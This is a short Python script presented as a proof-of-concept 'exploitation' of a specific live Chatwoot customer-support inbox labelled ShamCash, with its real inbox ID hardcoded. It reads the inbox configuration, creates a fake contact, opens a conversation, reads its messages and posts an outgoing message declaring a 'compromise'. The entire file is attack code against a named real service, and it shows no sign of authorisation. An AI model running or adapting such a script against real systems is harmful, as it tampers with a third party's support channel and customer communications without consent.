#!/usr/bin/env python3
"""
Chatwoot Public API PoC - ShamCash Inbox Exploitation
Demonstrates: Contact creation, conversation management, message interception
"""
import requests
import json
import sys

sys.stdout.reconfigure(encoding='utf-8', errors='replace')

INBOX_ID = 'LLh16AnfFXhFsReA6JiHBevQ'
BASE = f'https://app.chatwoot.com/public/api/v1/inboxes/{INBOX_ID}'

print('=' * 60)
print('Chatwoot Public API - ShamCash Inbox Exploitation PoC')
print('=' * 60)

# Step 1: List inbox info
print('\n[1] Inbox Information:')
r = requests.get(BASE, timeout=15)
if r.status_code == 200:
    inbox_data = r.json()
    print(f'  Name: {inbox_data.get("name")}')
    print(f'  Timezone: {inbox_data.get("timezone")}')
    print(f'  Working hours enabled: {inbox_data.get("working_hours_enabled")}')
    print(f'  Inbox config: {json.dumps(inbox_data, indent=2, ensure_ascii=False)[:500]}')
else:
    print(f'  Status: {r.status_code}')

# Step 2: Create a contact
print('\n[2] Creating test contact...')
r = requests.post(f'{BASE}/contacts', json={
    'name': 'HackerAI Pentest',
    'email': 'pentest@hackerai.local',
    'phone_number': '+963900000000'
}, timeout=15)
if r.status_code == 200:
    contact = r.json()
    print(f'  Contact created!')
    print(f'  Full response: {json.dumps(contact, indent=2, ensure_ascii=False)[:500]}')
    source_id = contact.get('source_id')
else:
    print(f'  Failed: {r.status_code}')
    source_id = '2396caed-a7f8-4596-bc7b-b5b92517d01b'

# Step 3: Create conversation
print('\n[3] Creating conversation...')
r = requests.post(f'{BASE}/contacts/{source_id}/conversations', timeout=15)
if r.status_code == 200:
    conv = r.json()
    conv_id = conv.get('id')
    print(f'  Conversation created!')
    print(f'  Full response: {json.dumps(conv, indent=2, ensure_ascii=False)[:800]}')
else:
    print(f'  Failed: {r.status_code}')
    conv_id = 2997294

# Step 4: Read messages
print(f'\n[4] Reading messages from conversation {conv_id}...')
r = requests.get(f'{BASE}/contacts/{source_id}/conversations/{conv_id}/messages', timeout=15)
if r.status_code == 200:
    messages = r.json()
    print(f'  Found {len(messages)} messages:')
    for i, msg in enumerate(messages):
        content = msg.get('content', '') or '[empty/attachment]'
        msg_type = 'SYSTEM' if msg.get('message_type') == 1 else 'USER'
        print(f'\n  --- Message {i+1} ({msg_type}) ---')
        print(f'  Content: {content[:500]}')
else:
    print(f'  Failed: {r.status_code}')

# Step 5: Send a message
print(f'\n[5] Sending new test message...')
r = requests.post(f'{BASE}/contacts/{source_id}/conversations/{conv_id}/messages', json={
    'content': 'HackerAI Security Assessment - Chatwoot public API compromise PoC',
    'message_type': 'outgoing',
    'private': False
}, timeout=15)
if r.status_code == 200:
    print(f'  Message sent successfully! ID: {r.json().get("id")}')
else:
    print(f'  Failed: {r.status_code}')

print('\n' + '=' * 60)
print('PoC Complete - Chatwoot API is fully accessible')
print('=' * 60)
